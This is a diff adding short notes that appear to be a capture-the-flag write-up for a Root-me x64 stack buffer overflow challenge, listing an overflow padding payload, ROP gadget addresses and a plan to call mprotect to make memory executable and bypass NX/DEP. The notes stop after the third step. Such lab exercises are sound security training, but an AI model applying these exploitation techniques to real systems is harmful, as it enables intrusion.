@@ -1,0 +1,26 @@
+## Root-me Challenge 34 - ELF x64 - Stack buffer overflow - advanced
+
+
+1. Find the overflow
+
+payload = ""
+payload += "A" * 280
+payload += "B" * 6
+
+
+2. NX/DEP is turned on so lets try ROP. We circumvent the protections by
+   using gadgets to manipulate memory permissions.
+
+# ROP gadgets
+syscall = 0x45eba5
+pop_rdx = 0x437205
+pop_rax = 0x44d2b4
+pop_rdi = 0x4016d3
+pop_rsi = 0x4017e7
+pop2ret = 0x437229      # pop rdx; pop rsi; ret
+
+
+3. mprotect(ch34, 2000, 7) 
+   Change permissions to RWX for 2k bytes of memory @ 0x400000
+
+
